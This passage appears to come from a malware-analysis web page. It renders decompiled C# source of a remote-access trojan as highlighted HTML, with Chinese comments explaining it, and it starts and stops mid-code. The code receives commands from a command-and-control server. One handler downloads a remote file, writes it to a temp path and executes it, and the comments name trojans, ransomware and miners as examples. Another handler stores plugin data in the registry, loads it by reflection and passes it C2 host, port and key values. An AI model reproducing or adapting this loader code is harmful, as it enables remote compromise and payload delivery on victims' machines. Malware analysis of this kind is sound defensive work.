style="--0:#4D9375;--1:#1E754F">else</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#5DA994;--1:#2E8F82">WebClient</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">wc</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">WebClient</span><span style="--0:#666666;--1:#999999">();</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">fileData</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">wc</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">DownloadData</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">2</span><span style="--0:#666666;--1:#999999">]);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 下载恶意文件</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">catch</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">MSG</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">Download ERROR</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">bla</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#4D9375;--1:#1E754F">return</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">bla</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 固定反馈，用于心跳/确认</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// 将恶意文件写入临时目录，命名为“随机临时文件.参数后缀”</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">tempPath</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">Path</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">GetTempFileName</span><span style="--0:#666666;--1:#999999">()</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">.</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">];</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">File</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">WriteAllBytes</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">tempPath</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">fileData</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 写入恶意文件</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">Process</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Start</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">tempPath</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 执行文件（如木马、勒索程序、挖矿程序）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">$"</span><span style="--0:#C98A7D;--1:#B56959">MSG</span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#C98A7D;--1:#B56959">Executed As </span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#C98A7D;--1:#B56959"> </span><span style="--0:#5DA994;--1:#2E8F82">FileInfo</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D;--1:#B56959">tempPath</span><span style="--0:#666666;--1:#999999">).</span><span style="--0:#C98A7D;--1:#B56959">Name</span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 反馈执行成功</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">Exception</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ex</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">$"</span><span style="--0:#C98A7D;--1:#B56959">MSG</span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#C98A7D;--1:#B56959">Execute ERROR </span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#C98A7D;--1:#B56959">ex</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Message</span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 反馈执行失败</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 指令分支5：inv - 加载恶意插件并执行 ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">else</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">Operators</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">CompareString</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">cmdType</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">inv</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">false</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// 从注册表读取插件数据（无数据则返回空字节数组）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">byte</span><span style="--0:#666666;--1:#999999">[]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">pluginData</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4D9375;--1:#1E754F">byte</span><span style="--0:#666666;--1:#999999">[])</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">GTV</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">],</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">byte</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">]);</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// 无插件数据且参数长度不足：向C2反馈异常</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">3</span><span style="--0:#666666;--1:#999999">].</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">&#x3C;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">10</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">&#x26;&#x26;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">pluginData</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">$"</span><span style="--0:#C98A7D;--1:#B56959">pl</span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}{</span><span style="--0:#C98A7D;--1:#B56959">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">]}{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#C98A7D;--1:#B56959">1</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">else</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#758575DD;--1:#A0ADA0">// 参数长度足够：从字节数组提取并解压插件数据，写入注册表存储</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">3</span><span style="--0:#666666;--1:#999999">].</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">></span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">10</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#5DA994;--1:#2E8F82">MemoryStream</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ms</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">MemoryStream</span><span style="--0:#666666;--1:#999999">();</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#4D9375;--1:#1E754F">int</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">skipLen</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">$"</span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#C98A7D;--1:#B56959">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">]}{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}{</span><span style="--0:#C98A7D;--1:#B56959">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">]}{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}{</span><span style="--0:#C98A7D;--1:#B56959">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">2</span><span style="--0:#666666;--1:#999999">]}{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">ms</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Write</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">b</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">skipLen</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">b</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">skipLen</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">pluginData</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ZIP</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">ms</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ToArray</span><span style="--0:#666666;--1:#999999">());</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">STV</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">],</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">pluginData</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">3</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 3=Binary类型，写入注册表</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">$"</span><span style="--0:#C98A7D;--1:#B56959">pl</span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}{</span><span style="--0:#C98A7D;--1:#B56959">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">]}{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#C98A7D;--1:#B56959">0</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 反馈插件加载准备完成</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#758575DD;--1:#A0ADA0">// 加载插件（OK.Plugin：反射加载插件程序集）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">object</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">plugin</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">RuntimeHelpers</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">GetObjectValue</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Plugin</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">pluginData</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">A</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">));</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#758575DD;--1:#A0ADA0">// 反射设置插件参数（H/P/osk：混淆变量，可能是C2地址/端口/密钥）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">NewLateBinding</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">LateSet</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">plugin</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">h</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">object</span><span style="--0:#666666;--1:#999999">[]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">H</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">},</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">NewLateBinding</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">LateSet</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">plugin</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">p</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">object</span><span style="--0:#666666;--1:#999999">[]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">P</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">},</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">NewLateBinding</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">LateSet</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">plugin</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">osk</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">object</span><span style="--0:#666666;--1:#999999">[]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">2</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span 